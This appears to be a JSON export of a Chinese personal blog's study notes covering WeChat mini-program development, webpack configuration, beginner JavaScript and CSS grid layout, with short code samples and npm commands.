代表一个页面，例如：\n\u0026quot;pages\u0026quot;:[\r\u0026quot;pages/index/index\u0026quot;,\r\u0026quot;pages/demo/demo\u0026quot;\r],\rwindow属性是设置小程序的窗口样式，例如：\n\u0026quot;window\u0026quot;:{\r\u0026quot;backgroundTextStyle\u0026quot;:\u0026quot;light\u0026quot;,\r\u0026quot;navigationBarBackgroundColor\u0026quot;: \u0026quot;#fff\u0026quot;, // 导航栏背景颜色\r\u0026quot;navigationBarTitleText\u0026quot;: \u0026quot;Weixin\u0026quot;, // 导航栏文本\r\u0026quot;navigationBarTextStyle\u0026quot;:\u0026quot;black\u0026quot; // 导航栏文本颜色\r},\r从上面可以看出是一个三层结构，页面是放在pages目录下的，而demo和index都是代表这个页面叫什么\ndemo.js，Page()是小程序提供的一个函数，用来初始化页面，参数是一个对象，用来配置当前页面的属性\ndemo.wxml，该文件是用来描述页面的，和html类似\npages文件夹：存放小程序页面，每个页面代表为一个文件夹，文件夹名称为页面名称，在这个页面文件夹下的全部文件都是描述这个页面的\nutils文件夹：用于存放公共的js程序，便于不同的页面进行调用\nimgages文件夹：为方便管理小程序的用到的全部静态图片\napp.js：当前项目的js（全局数据和反应）\njson：全局配置\nwxss：全局样式\nproject.config.json：项目配置文件，配置微信开发者工具，例如工具的页面颜色，编译配置等等个性化配置\npage.json: 单独定义每个页面的一些属性，例如：顶部颜色，是否可以下拉刷新等等\napp.json：这是一种数据格式，小程序的静态配置（全局配置），页面的路径，界面的表现，顶部样式，网络超时等等\npages字段：描述当前小程序所有页面的路径，让微信清楚小程序页面定义在哪个目录\nwindow字段：定义小程序所有页面的顶部背景颜色，文字颜色等等\njson是包裹在一个括号中，以键值对的方式表达数据，值必须包含在双引号中，在json中无法使用注释\nwxml\nWXML：从html中衍生而来一种专门在小程序页面中使用的语言，组合了基础组件，事件系统，构造出页面的结构\nview元素是表示块级，和div类似\nscroll-view元素是表示可滚动页面区域\ntext元素是表示行内文本，和span类似\nimage元素是表示图片，和img类似\nswiper元素是用来搞轮播图\n属性\n\u0026lt;view 属性=\u0026ldquo;属性值\u0026rdquo;\u0026gt;\nbindtap属性可绑定事件函数\nhidden属性控制元素是否隐藏，true为隐藏\nwxss样式，采用css样式语法，和写普通的css样式一样，选择器属性样式之类的就不写了，具备css大部分的特性，具体看我写的css笔记，背景，字体，边框，定位，大小之类的，用法是一样的，可以给wxml标签设置class，采用的是W3C标准盒模型，另外小程序官方推荐使用flex布局\n推荐静态样式写入class中，style用来接收动态的样式，避免出样式优先级问题，例如：\nAlt+shift+f：自动格式化代码\n注意：微信小程序的基本单位是rpx，而不是px，不管是什么页面（无论多大或者多小），页面100%就是750rpx，因此页面的1%等于7.5rpx\n另外微信官方提供了一套UI框架，https://weui.io/，github库地址：https://github.com/Tencent/weui-wxss/\n用法，直接引用weui.wxss，然后像用bootstrap一样，给标签加类\n例子：\n\u0026lt;view style=\u0026quot;width:100rpx;height:100rpx;background-color:{{color}}\u0026quot;\u0026gt;hallo wrod\u0026lt;/view\u0026gt;\rPage({\rdata: {\rcolor: '#ccc'\r}\r})\rWXSS选择器支持.class，#id，组件选择（例如view，选择全部view组件），::after（view::after，在view组件后插入内容），::before（view::before，在view组件前面插入内容）\n项目目录结构\napp.js：必需，小程序的逻辑所在\napp.json：必需，小程序的公共配置\napp.wxss：不必需，小程序的公共样式\n页面组成\njs：必需，页面逻辑\nwxml：必需，页面结构\njson：不必需，页面的配置\nwxss：不必需，页面的样式\n小程序支持的文件：\nwxs，png，jpg，jpeg，gif，svg，json，cer，mp3，aac，m4a，mp4，wav，ogg，silk，wasm，br\n全局配置：app.json是用于小程序进行的全局配置，决定页面文件路径，窗口表现，网络超时等等\npages配置：定义页面的路径，优先显示第一个设置的页面\nwindow配置：定义所有页面的顶部样式\ntabBar配置：底部tab栏的表现\n页面配置：每个页面都可以使用.json来配置当前页面的窗口表现，注意：会覆盖掉app.json相同的配置项\nstiemap配置：通过配置sitemap.json或者后台页面收录开关来确定小程序页面是否允许被微信索引，当被允许时，微信会通过爬虫的形式，对小程序的页面内容进行索引\n生命周期\n应用生命周期\nonLaunch：小程序初始化，当页面第一次加载时触发，跳转页面返回不触发\nonShow：小程序显示（前台），当页面显示或者从后台返回小程序显示该页面时触发，从跳转页面返回时触发\nonError：小程序页面异常触发\nonPageNotFound：页面不存在\n页面生命周期\nonLoad：页面加载触发\nonShow：页面显示触发\nonReady：页面初次渲染完成触发\nonHide：页面隐藏触发\nonUnload：小程序页面卸载，例如： 重定向一个页面，原页面被关闭\nonPullDownRefresh：用户下拉触发\nonReachBottom：页面上拉触底触发\nonPageScroll：页面被滚动触发\nonResize：页面尺寸发生改变时输出\n小程序组件生命周期\ncreated：当组件实例被初始化时触发该生命周期钩子（在该钩子触发时，并不能使用setData，this.data等于Component.data）\nattached：当组件实例初始化完毕，进入页面节点树后触发该生命周期钩子（this.data被初始化为组件的当前值）\nready：当组件实例在视图层布局完成后触发该生命周期钩子\nmoved：当组件实例被移动到节点树另一个位置时触发该生命周期钩子\ndetached：当组件实例被销毁时触发该生命周期钩子（退出当前组件的页面树，也会触发该生命周期钩子）\nerror：当组件方法抛出错误时触发该生命周期钩子\nWXML，数据绑定，列表渲染，条件渲染，模板引用\n数据绑定和vue类似，不过小程序的数据绑定是单向的\nindex.wxml\n\u0026lt;view\u0026gt; {{message}} \u0026lt;/view\u0026gt;\rindex.js\nPage({\rdata: {\rmessage: 'hallo word'\r}\r})\r属性绑定\nindex.wxml\n\u0026lt;view\u0026gt;\r\u0026lt;text class='{message}'\u0026gt;\u0026lt;/text\u0026gt;\r\u0026lt;/view\u0026gt;\rindex.js\nPage({\rdata: {\rmessage: 'hallo word'\r}\r})\r列表渲染\n\u0026lt;block wx:for=\u0026quot;{{arrs}}\u0026quot; wx:fot-item=\u0026quot;abc\u0026quot; ws:key=\u0026quot;index\u0026quot;\u0026gt; \u0026lt;view\u0026gt;\r{{index}}:{{abc}} \u0026lt;/view\u0026gt;\r\u0026lt;/block\u0026gt;\rPage({\rdata: {\rarrs: [1,2,3,4,5]\r}\r})\r条件渲染\n\u0026lt;view wx:if=\u0026quot;{{hallo}}\u0026quot;\u0026gt; True \u0026lt;/view\u0026gt;\r\u0026lt;view wx:if=\u0026quot;{{abc === 1}}\u0026quot;\u0026gt; hallo wrod \u0026lt;/view\u0026gt;\rPage({\rdata: {\rhallo: true,\rabc: 2\r}\r}\r允许使用wx:if，wx:elif和wx:else使用\nwx:if是控制属性，可以判断组件是否是否显示，多个组件使用block元素包裹\nvx:if和hidden组件的区别，hidden是通过hidden属性隐藏，vx:if是通过局部重新渲染的方式，直接将该组件移除出该DOM\nWXML的共同属性，id，class，style，hidden，data-，bind/catch*\n模板引用\ndata.wxml\n\u0026lt;template name='tempa'\u0026gt;\r\u0026lt;view\u0026gt;\rid: {{id}}\rname: {{name}}\rage: {{age}}\r\u0026lt;/view\u0026gt;\r\u0026lt;/template\u0026gt;\rindex.wxml index.js\nPage({\rdata: {\rdataitem: {\rid: 1,\rname: chenjunlin,\rage: 20\r}\r}\r})\r注意：import模板时，是存在作用域的，只能import该模板的内容，如果这个wxml文件内有其他内容是不会被渲染到页面的，避免模板引用死循环\n而使用include组件引用的话，是直接目标整个引入进来，这个时候引用模板和直接在声明模板的文件使用是一样的，就好像include组件将目标整个复制进来一样\nWXS\nWXS是小程序的脚本语言，搭配WXML使用，WXS不依赖于小程序的运行时基本库版本，和JavaScript环境隔离，WXS不能调用js文件定义的，也不能使用小程序提供的api，WXS函数不能作为事件回调函数\n\u0026lt;wxs module='hhh'\u0026gt;\rvar abc = 'hallo word'\rmodule.exports = {\rxyz: abc\r}\rmodule.exports.value = 100\r\u0026lt;/wxs\u0026gt;\r\u0026lt;view\u0026gt;{{hhh.xyz}}\u0026lt;/view\u0026gt;\r\u0026lt;view\u0026gt;{{hhh.value}}\u0026lt;/view\u0026gt;\r小程序事件\n事件是视图层到逻辑层的通讯方式，监听用户的行为，通过事件的方式反映到逻辑层进行处理\n点击事件（tap），长按事件（longpress），触摸事件（例如：开始触摸（touchstart），结束触摸（touchend），终止触摸（touchcancel））等等\n事件（视图层到逻辑层的通信）\n\u0026lt;view id='tap' bindtap='taptest'\u0026gt; hallo word \u0026lt;/view\u0026gt;\rPage({\rtaptest(event) {\rconsole.log(event)\r}\r})\r事件处理机制：事件捕获，事件处理，事件冒泡\n路由\n打开新页面通过调用wx.navigateTo API或者使用组件\n页面重东西通过调用wx.redirectTo API或者使用组件\n页面返回通过调用wx.navigateBack API或者使用组件\ntab切换通过调用wx.switchTab API或者使用组件\n重启动通过调用wx.reLaunch API或者使用组件\nMINA(MINA IS NOT APP) 是微信开发小程序的框架\nMINA框架由视图层（小程序的page页面），逻辑层，系统层（JSBridge，微信API，离线存储，网络请求等等）组成\n渲染会将WXML节点转换成js对象（AST节点树），更新数据时会进行diff差异处理\n小程序运行机制\n启动（冷启动（首次启动需要加载，生命周期为销毁时），热启动（无需加载））\n微信小程序提供2个线程来处理，分别是View Thread和AppService Thread，这2个线程同时进行加载（并行），View Thread加载完毕后，会通知AppService Thread，AppService Thread再将处理完毕的数据交付给View Thread\n微信小程序API\n网络请求，媒体处理，上传下载文件，数据缓存，位置信息，设备信息，路由控制\n微信开放功能：登录授权，微信支持，模板消息，转发分享，打开APP\nAPI一般有3个回调函数，success（api成功后），fail（api调用失败后），complete（api调用完成时，不管成功与否）\nApi官方文档：https://developers.weixin.qq.com/miniprogram/dev/api/\n","permalink":"https://99999.fun/posts/48/","summary":"小程序实质上就是一个基于web基础的应用程序（网页）（但是不支持浏览器的api，小程序的api全部由微信提供，高度依赖微信，因此只能在微信中运行）\n微信之父张小龙是这样描述小程序的：\n小程序是一种不需要下载安装就可以使用的应用，它实现了应用触手可及的梦想。\n用户扫一扫或者搜一下即可打开应用，也体现了用完即走的理念。\n用户不用关心是否安装太多应用的问题，应用将无处不在，随时可用，但又无需安装卸载\n微信小程序的接口服务器要求进行ICP备案，并且经过审核，才能发布小程序\n微信小程序开发文档\nhttps://developers.weixin.qq.com/miniprogram/dev/framework/\n开发工具：微信开发者工具\n小程序的宿主环境\n在iOS中，使用JavaScriptCore，在Android中使用X5内核，在ide中使用nwjs\n小程序的运行机制（冷启动，热启动）\n小程序在后台中停留一段时间后，被微信销毁，再打开时需要重新加载该小程序的资源，也就是冷启动，而在没被销毁的时间段内，再打开该小程序，是不需要重新加载资源，是热启动\n小程序发布更新时，会异步加载新资源，也会导致冷启动\n小程序产品需求\n发现真实需要\n用户深度访谈，分析竞品，付费意愿\n需求分期：最小化可行产品（MVP）\n不是每个功能都要开发（优先开发最重要和最紧急的功能）\n优化开发顺序，先开发基础可用，然后迭代更新功能，满足用户需求，功能文档\n根据用户体验来优化服务\n原型制作工具：墨刀，Axure\n微信小程序结构\nindex.wxml页面结构\nindex.wxss页面样式\nindex.js页面逻辑\n如果设置了单独的页面样式，那么会覆盖掉app.wxss的样式\napp.json定义了页面和基本配置，采用json格式，必须包含pages属性，说明小程序有哪些页面\napp.json文件结构\npages是用来定义页面的，是一个数组，每一个项都是代表一个页面，例如：\n\u0026quot;pages\u0026quot;:[\r\u0026quot;pages/index/index\u0026quot;,\r\u0026quot;pages/demo/demo\u0026quot;\r],\rwindow属性是设置小程序的窗口样式，例如：\n\u0026quot;window\u0026quot;:{\r\u0026quot;backgroundTextStyle\u0026quot;:\u0026quot;light\u0026quot;,\r\u0026quot;navigationBarBackgroundColor\u0026quot;: \u0026quot;#fff\u0026quot;, // 导航栏背景颜色\r\u0026quot;navigationBarTitleText\u0026quot;: \u0026quot;Weixin\u0026quot;, // 导航栏文本\r\u0026quot;navigationBarTextStyle\u0026quot;:\u0026quot;black\u0026quot; // 导航栏文本颜色\r},\r从上面可以看出是一个三层结构，页面是放在pages目录下的，而demo和index都是代表这个页面叫什么\ndemo.js，Page()是小程序提供的一个函数，用来初始化页面，参数是一个对象，用来配置当前页面的属性\ndemo.wxml，该文件是用来描述页面的，和html类似\npages文件夹：存放小程序页面，每个页面代表为一个文件夹，文件夹名称为页面名称，在这个页面文件夹下的全部文件都是描述这个页面的\nutils文件夹：用于存放公共的js程序，便于不同的页面进行调用\nimgages文件夹：为方便管理小程序的用到的全部静态图片\napp.js：当前项目的js（全局数据和反应）\njson：全局配置\nwxss：全局样式\nproject.config.json：项目配置文件，配置微信开发者工具，例如工具的页面颜色，编译配置等等个性化配置\npage.json: 单独定义每个页面的一些属性，例如：顶部颜色，是否可以下拉刷新等等\napp.json：这是一种数据格式，小程序的静态配置（全局配置），页面的路径，界面的表现，顶部样式，网络超时等等\npages字段：描述当前小程序所有页面的路径，让微信清楚小程序页面定义在哪个目录\nwindow字段：定义小程序所有页面的顶部背景颜色，文字颜色等等\njson是包裹在一个括号中，以键值对的方式表达数据，值必须包含在双引号中，在json中无法使用注释\nwxml\nWXML：从html中衍生而来一种专门在小程序页面中使用的语言，组合了基础组件，事件系统，构造出页面的结构\nview元素是表示块级，和div类似\nscroll-view元素是表示可滚动页面区域\ntext元素是表示行内文本，和span类似","title":"微信小程序学习笔记"},{"content":"webpack作为模块加载和打包神器\n安装node就有npm了，用npm安装webpack\nnpm i webpack webpack-cli -g 安装全局的webpack\n到项目目录下，npm init -y 初始化模块\nnpm i webpack webpack-cli -D 安装项目局部的webpack，-D是\u0026ndash;save-dev的意思，推荐使用\nwebpack 入口文件名 最后输出到哪个文件的文件名，例如：\nnpx webpack A.js B.js\n那么就会编译A.js，输出到B.js\nwebpack只能处理JavaScript，处理其他类型的文件，需要安装几个包\nnpm install css-loader style-loader\n假设有个一个abc.css文件，里面定好了样式\n那么修改A.js\nrequire(\u0026quot;!style-loader!css-loader!./abc.css\u0026quot;); document.write(require(\u0026quot;./C.js\u0026quot;));\n再打包一次\nnpx webpack A.js B.js\n会出现一个C.js\n配置webpack.config.js\nmodule.exports = {\rentry: '入口文件的路径',\routput: {\rpath:__dirname,\rfilename: '最后输出到哪个文件的文件名'\r},\rmodule: {\rrules: [{\rtest: '处理什么格式的文件',\ruse:[\r{\rloader: '依赖包'\r}\r]\r}\r]\r}\r};\r模块化\nimport $ from \u0026ldquo;jquery\u0026rdquo; // 导入jQuery，只需要src当前js文件就可以导入jQuery依赖\nloader加载器打包非js模块，比如：\nless-loader：打包.less相关文件\nsass-loader：打包.scss相关文件\nurl-loader：打包处理css中与url路径相关的文件\nwebpack打包处理过程：\n先判断是否为js模块，不是就检查是否配置了对应的loader，配置了就是调用loader处理，没有配置就是报错\n如果是js模块就判断是否包含了高级js语法，没有包含就直接调用webpack处理，包含了就检查是否配置了babel，配置了就是调用loader处理，没有配置就报错\n加载器的使用\nnpm i style-loader css-loader -D // 安装处理css文件的loader\n在webpack.config.js的module -\u0026gt; rules数组中，添加loader规则，例如：\nmodule: {\rrules: [\r{\rtest: /\\.css$/, use: [\u0026quot;style-loader\u0026quot;,\u0026quot;css-loader\u0026quot;]\r}\r]\r}\r注意：\ntest表示匹配的文件类型，use表示要调用的loader\nuse数组中指定的loader顺序是固定的，调用顺序是从后往前调用的\nless loader\nnpm i less-loader less -D\ntest: /.less$/, use: [\u0026ldquo;style-loader\u0026rdquo;,\u0026ldquo;css-loader\u0026rdquo;,\u0026ldquo;less-loader\u0026rdquo;]\n先把less解析为css文件，然后再解析css文件\nscss loader\nnpm i sass-loader node-sass -D\ntest: /.scss$/, use: [\u0026ldquo;style-loader\u0026rdquo;,\u0026ldquo;css-loader\u0026rdquo;,\u0026ldquo;sass-loader\u0026rdquo;]\n打包样式表的图片和字体\nnpm i url-loader file-loader -D\ntest: /.jpg|png|gif|bmp|ttf|eot|svg|woff|woff2$/, use: \u0026ldquo;url-loader?limit=1024\u0026rdquo;\nlimit是用来指定图片的大小的，单位是字节（b），只有小于limit大小的图片，才被转换为base64图片\n打包js高级语法\n安装babel转换器相关的包\nnpm i babel-loader @babel/core @babel/runtime -D\n安装babel语法插件相关的包\nnpm i @babel/preset-env @babel/plugin-transform-runtime @babel/plugin-proposal-properties -D\n配置babel.config.js并初始化\nmodule.exports = {\rpresets: [\u0026quot;@babel/preset-env\u0026quot;],\rplugins: [\u0026quot;@babel/plugin-transform-runtime\u0026quot;,\u0026quot;@babel/plugin-proposal-properties\u0026quot;]\r}\r配置webpack.config.js\ntest: /.js$/, use: \u0026ldquo;babel-loader\u0026rdquo;, exclude: /node_modules/\nexcludes是排除项，表示babel-loader不需要处理node_modules中的js文件\n配置postCSS，自动添加css兼容性\nnpm i postcss-loader autoprefixer -D\n配置postcss.config.js，并且初始化\nconst autoprefixer = require(\u0026quot;autoprefixer\u0026quot;) // 导入插件\rmodule.exports = {\rplugins: [autoprefixer] // 加载插件\r}\r配置webpack.config.js\ntest: /.css$/, use: [\u0026ldquo;style-loader\u0026rdquo;,\u0026ldquo;css-loader\u0026rdquo;,\u0026ldquo;postcss-loader\u0026rdquo;]\n导入vue单文件组件\nimport App from \u0026ldquo;./App.vue\u0026rdquo;\n安装处理vue单文件的loader\nnpm i vue-loader vue-template-compile -D\n添加loader配置文件\n处理vue文件的loader需要VueLoaderPlugin插件\nconst VueLoaderPlugin = require(\u0026quot;vue-loader/lib/plugin\u0026quot;);\rtest: /\\.vue$/, loader: \u0026quot;vue-loader\u0026quot;\rplugins: [\rnew VueLoaderPlugin()\r]\rwebpack dev-Server和proxy代理\nloaders及plugins的处理\nresolve/sourceMap\nwebpack性能优化（TreeShaking，热更新）\n具体请看webpack官方文档\n","permalink":"https://99999.fun/posts/47/","summary":"webpack作为模块加载和打包神器\n安装node就有npm了，用npm安装webpack\nnpm i webpack webpack-cli -g 安装全局的webpack\n到项目目录下，npm init -y 初始化模块\nnpm i webpack webpack-cli -D 安装项目局部的webpack，-D是\u0026ndash;save-dev的意思，推荐使用\nwebpack 入口文件名 最后输出到哪个文件的文件名，例如：\nnpx webpack A.js B.js\n那么就会编译A.js，输出到B.js\nwebpack只能处理JavaScript，处理其他类型的文件，需要安装几个包\nnpm install css-loader style-loader\n假设有个一个abc.css文件，里面定好了样式\n那么修改A.js\nrequire(\u0026quot;!style-loader!css-loader!./abc.css\u0026quot;); document.write(require(\u0026quot;./C.js\u0026quot;));\n再打包一次\nnpx webpack A.js B.js\n会出现一个C.js\n配置webpack.config.js\nmodule.exports = {\rentry: '入口文件的路径',\routput: {\rpath:__dirname,\rfilename: '最后输出到哪个文件的文件名'\r},\rmodule: {\rrules: [{\rtest: '处理什么格式的文件',\ruse:[\r{\rloader: '依赖包'\r}\r]\r}\r]\r}\r};\r模块化","title":"webpack学习笔记"},{"content":"插入js\n在html页面使用js 引用js文件 注释\n// 单行注释\n/* 多行注释\n*/\n变量\nvar home // 声明一个变量使用var\nhome = \u0026ldquo;hallo\u0026rdquo; // 使用=来把字符串hallo赋值到home变量\n变量命名要求： 必须以字母、下划线或美元符号开头，后面可以跟字母、下划线、美元符号和数字\n建议每一行语句结束使用;来表示结束当前语句，主要是给人看\nvar num = 123 // 整数\nnum = \u0026ldquo;123\u0026rdquo; // 字符串\nnum = 1.23 // 浮点数（小数）\nnum = true // 布尔值（真，假或者对，错的意思，true是真，false为假）\nnum = 1+1 // 可以进行运算，也可以连接两个字符串\nnum = \u0026ldquo;hallo\u0026rdquo; + \u0026ldquo;javascript\u0026rdquo;\nvar nums = 1\nnums++ // 和nums = nums+1意思是一样，所以这个时候nums = 1+1 =2\nnums\u0026ndash; // 和nums = nums-1意思是一样，所以这个时候nums = 1-1 = 0\n\u0026lt; 小于 \u0026gt; 大于 \u0026lt;= 小于或者等于 \u0026gt;= 大于或者等于 == 没错，这个才是等于，=这个是用来赋值的 != 不等于\n比较的结果一定是布尔值，要么true。要么false\n\u0026amp;\u0026amp; 和，与的意思，必须是两个条件都符合，才会返回true，否则返回false\n|| 或者的意思，只要符合其中的一个条件就返回true，否则返回false\nnum = 1\na = !(num\u0026gt;2)\n//这个返回true，因为num不大于2，所以是false，但是!()可以把真看成假，把假看成真\n操作符之间的优先级（高到低）:\n算术操作符 → 比较操作符 → 逻辑操作符 → \u0026ldquo;=\u0026ldquo;赋值符号\n同级的运算是按从左到右次序进行,多层括号由里向外。\nnum = 1\nnum = numa + 1 \u0026gt; 2 \u0026amp;\u0026amp; numa * 2 \u0026lt; 2\n// (numa +1)\u0026gt;2 (numa *2) \u0026lt;2 所以num 的值为false\nvar array = new Array() // 定义数值\narray[0] = \u0026ldquo;hi\u0026rdquo; array[1] = \u0026lsquo;hallo\u0026rsquo;\n数值从0开始，数值是值的整合，每一个数值的值都有一个索引号\narray = new Array(5) //定义数值，创建8个值\n创建的新数组是空数组，没有值，输出会显示undefined\narray = new Array(1,2,3,4,5,6) // 定义数组，同时赋值\narray = new Array[1,2,3,4,5,6] // 定义数组，同时直接输入个数组\narray[99] = 66 //使用一个新的索引，为数值添加一个新的元素\ndocument.write(array[1]) //输出array数组，索引号为1的值\narray.length = 6 // 获取数组array的长度，并且修改数值的长度\nalert(array.length) // 输出6\nvar Array = [[0,1],[2,3]] // 定义一个二维数组\narray[0][1] = 5 // 把第0行的第1列的元素赋值为5\nif(条件)｛\r程序块\r｝\r条件必须为true（真）时才会执行程序块，为假（false）时忽略跳过或者执行else的内容，又或者执行else if的内容\n会被认为是false（假）的有：false，0，“”，NaN，null，undefined\nreturn //终止\nvar code = 'hallo'\rif (code == 'hallo'){\rdocument.write('hallo')\r}else if(code == 'no'){\rdocument.write('no')\r}else{\rdocument.write('go')\r}\rswitch(变量){\rcase值: // 当等于或者符合某个值时，执行case下的程序块\rbreak\rdefault:\r// 当都不等于或者不符合上面给出的某个值时，执行default下的程序块，就比如if的else一样\rbreak\r}\rcode = 3\rswitch(code){\rcase 1:\rdocument.write('1')\rbreak\rcase 2:\rdocument.write('2')\rbreak\rcase 3:\rdocument.write('3')\rbreak\rdefault:\rbreak\r}\rfor(初始值;条件;更改初始值){\r// 必须条件符合才执行程序块，当条件不符合时，跳出for循环\r}\rfor(code=1;code\u0026lt;=3;code++){\rdocument.write(code)\r}\rwhile(条件){\r// 当条件为真时，执行该程序块，如果条件一直为真时，会一直执行下去，所以一定要保证条件结果可能为假\r}\rwhile (code \u0026lt;= 10){\rdocument.write('code')\rcode++\r}\rcode = 1\rdo{\rdocument.write(code)\rcode++\r}\rwhile (code \u0026lt;= 5)\rfor (code = 1;code\u0026lt;=10;code++){\rif(code == 2){\rcontinue\r}\rif(code == 3){\rbreak\r}\rdocument.write(code)\r}\rfunction 函数名(传参，不强制必须要传参){\r// 当执行该函数时，执行程序块\r}\r函数名(传参，不强制必须要传参)//触发函数\r在函数内部定义的变量，只作用于该函数内部，并不影响函数外部定义的变量\n在函数内部定义的变量就叫局部变量，在函数外部定义的变量叫全局变量\n在函数内部可以获取函数外部的变量，在函数外部，不能获取到函数外部的变量\n注意的是：只作用于该函数内部，不影响其他函数内部\n;(functiom(){\r//....\r// 为了避免污染全局变量，可以使用这种方法\r})()\rfunction code(a,b){\rnum = a+b\ralert(num)\rreturn num\r}\rcode(1,2)\r事件\nonclick是鼠标点击事件，当点击鼠标时，执行被调用程序块\nonmouseover是鼠标经过事件，当鼠标移到一个对象上，就触发onmouseover事件，并执行被调用的程序块\nonmouseout是鼠标移开事件，当鼠标移开当前对象时，触发该事件，并执行被调用程序块\nonfocus是光标聚焦事件，例如光标移到文本框内时，就是焦点在文本框内上，触发该事件，并执行被调用程序块\nonblur是失焦事件，和光标聚焦事件相反\nonselect是内容选中事件，当文本框或者文本域中的文字被选中时触发该事件，并执行被调用程序块\nonchange是文本框内容改变事件，当通过修改例如文本框的内容时触发该事件，并执行被调用程序块\nonload是加载事件，当页面加载完成后触发该事件，并执行被调用程序块\nonunload是卸载事件，当退出页面或者页面刷新等等操作时触发该事件，并执行被调用程序块\n对象\nvar name = new Array() // 定义个数组对象\nname.length // 使用array对象的length属性来获取数组的长度，这是获取到对象的属性的例子\nDate 对象\nvar go_date = new Date(); // 假如是2012年1月2日\ndocument.write(go_date); // 输出go_date的值，不同浏览器，时间格式有差异\ngetFullYear(); // 返回年份时间\nsetFullYear(); // 设置年份时间\ndocument.write(go_date.getFullYear()); //输出go_date的年份，输出2012\ngo_date.setFullYear(2022); // 设置go_date的年份，go_date的年份已经设置为2022\ndocument.write(go_date.getFullYear()); // 这个时候输出go_date的年份，输出结果为2022\ngetDay(); // 返回星期，0到6的整数，0表示星期天\ndocument.write(go_date.getDay()) // 输出数字，可以通过数组来返回相对于的星期\ngetTime(); // 返回时间，单位毫秒，返回 1970 年 1 月 1 日至今的毫秒数 setTime(); // 设置时间\nlength返回字符串长度 var str_01 = \u0026ldquo;hello JavaScript\u0026rdquo;; var str_02 = str_01.length;\ntoUpperCase()把字符串小写字母转换为大写字母 var str_03 = str_01.toUpperCase();\ncharAt()返回指定位置的字符串 document.write(str_01.charAt(0));\nindexOf()返回指定字符串中首次出现的位置\ndocument.write(str_01.indexOf(\u0026lsquo;h\u0026rsquo;);\nwindows对象\nalert(); // 弹窗，只能确定\nconfirm(); // 弹窗，可以确定，也可以取消，返回是布尔值\nprompt(); // 弹窗，可以输入内容（传入内容）\nsetTimeout(函数,时间); // 定时器，时间是毫秒，1000毫秒=1秒，当时间到了就触发函数，只会触发一次\nsetInterval(函数,时间); // 每一到指定的时间就触发一次函数，可以触发n次\nclearInterval(清除定时器);\nDOM\ndocument.getElementById(); // id选择器 document.getElementsByTagName(); // 标签选择器 document.getElementsByClassName(); // 类名选择器\ndocument.createElement(); // 创建dom document.body.appendChild();\naddEventListener(); //添加点击事件\ninnerText(); // 添加文本\nES6模块化\nexport语法\nexport default默认导出\nexport abc需要使用import { abc } form \u0026lsquo;./test.js\u0026rsquo;的方式导入\nbabel编译功能\nnpm install \u0026ndash;save-dev babel-core babel-preset-es2015 babel-preset-latest\nnpm install \u0026ndash;global babel-cli\n.babelrc文件\n{\r'presets': ['es2015','latest'],\r'plugins': []\r}\rwebpack\nnpm install webpack babel-loader \u0026ndash;save-dev\nwebpack.config.js配置文件\nrollup打包工具\nnpm install rollup rollup-plugin-node-resolve rollup-plugin-babel babel-plugin-external-helpers babel-preset-latest babel-core \u0026ndash;save-dev\nrollup.config.js配置文件\nimport babel form 'rollup-plugin-babel'\rimport resolve form 'rollup-plugin-node-resolve'\rexport default{\rentry: 'src/index.js',\rformat: 'umd',\rplugins: [\rresolve(),\rbabel({\rexclud: 'node_modules/**'\r})\r],\rdest: 'build/bundle.js'\r}\rrollup -c rollup.config.js\nAMD模块化标准，nodejs模块化标准（CommonJS），ES6模块化标准，兼容模块化UMD\nclass实质上是构造函数的语法糖，构建器constructor就是构造函数，不过class的方法是在类内部创建的，而构造函数是通过扩展原型的方式（prototype），让实例具备该方法\n构造函数等于构造函数的原型的构造器（prototype.constructor）\n实例.__proto__等于构造函数的原型\n构造函数继承（同时也是class继承的原理）\nAbc.prototype = new Xyz()\n这样Abc构造函数就可以继承Xyz构造函数的属性和方法\npromise\n原型\n异步\n虚拟DOM\nMVVM\n组件化\nhybrid\n","permalink":"https://99999.fun/posts/46/","summary":"插入js\n在html页面使用js 引用js文件 注释\n// 单行注释\n/* 多行注释\n*/\n变量\nvar home // 声明一个变量使用var\nhome = \u0026ldquo;hallo\u0026rdquo; // 使用=来把字符串hallo赋值到home变量\n变量命名要求： 必须以字母、下划线或美元符号开头，后面可以跟字母、下划线、美元符号和数字\n建议每一行语句结束使用;来表示结束当前语句，主要是给人看\nvar num = 123 // 整数\nnum = \u0026ldquo;123\u0026rdquo; // 字符串\nnum = 1.23 // 浮点数（小数）\nnum = true // 布尔值（真，假或者对，错的意思，true是真，false为假）\nnum = 1+1 // 可以进行运算，也可以连接两个字符串\nnum = \u0026ldquo;hallo\u0026rdquo; + \u0026ldquo;javascript\u0026rdquo;\nvar nums = 1\nnums++ // 和nums = nums+1意思是一样，所以这个时候nums = 1+1 =2\nnums\u0026ndash; // 和nums = nums-1意思是一样，所以这个时候nums = 1-1 = 0","title":"JavaScript基础学习笔记"},{"content":"grid 布局\ngrid布局和flex布局类似，不过grid是最强大的css布局方式\ngrid布局是网格布局\ndisplay: grid; // 定义grid布局，默认为块级元素\ndisplay: inline-grid // 设置为行内元素\n设置为grid布局后，容器的子元素的float（浮动），display: inlne-block（行内块级元素），display: table-cell（表格单元格），vertical-align（垂直对齐方式）之类的全部都会失效\n列宽和行高的设置\ngrid-template-columns: 100px; // 列宽\ngrid-template-rows: 100px; // 行高\n数值也支持百分比\ngrid-template-columns: repeat(3, 100px); // 列宽，重复次数为3，重复的值为100px，和下面效果是一样的\ngrid-template-columns: 100px 100px 100px;\ngrid-template-rows: repeat(auto-fill, 100px); // 行高，自动填充容器，行高为100px\ngrid-template-rows: 1fr 2fr; // 行高，第二个的行高是第一的2倍\ngrid-template-rows: minmax(100px, 300px); // 生成一个长度范围，长度在这个范围内，两个参数分别代表最小值和最大值，这里表示的是行高不小于100px，不大于300px\ngrid-template-rows: auto; // 由浏览器决定行高\ngrid-template-columns: [a1] 100px [a2] 100px [a3] auto; // 方括号[]内的的值是用于指定网格的名称\ngrid-template-columns: 20% 60% 20%; // 左栏20%，中间60%，右栏20%，如果是重复的值搭配repeat使用更佳\ngrid-row-gap: 10px; // 行间距（行与行的距离）\ngrid-column-gap: 10px; // 列间距（列与列的距离）\n可以简写为grid-gap: 10px 20px; // 行间距，列间距，如果只提供一个值，那么行间距，列间距都为那个值\ngrid-row-start: 2; // 指定从哪条行开始，这里指定在第二行上\ngrid-column-start: 2; // 指定从哪条列开始，这里指定在第二列上\ngrid-row-end: 2; // 指定横跨第几行，这里指定的是第二行\ngrid-column-end: 2; // 指定横跨第几列，这里指定的是第二列\n上面的属性默认为auto，可以简写为下面的\n指定项目放在哪个区域\ngrid-area: b; // 指定该项目放在b区域\ngrid-area：2 / 2 / span 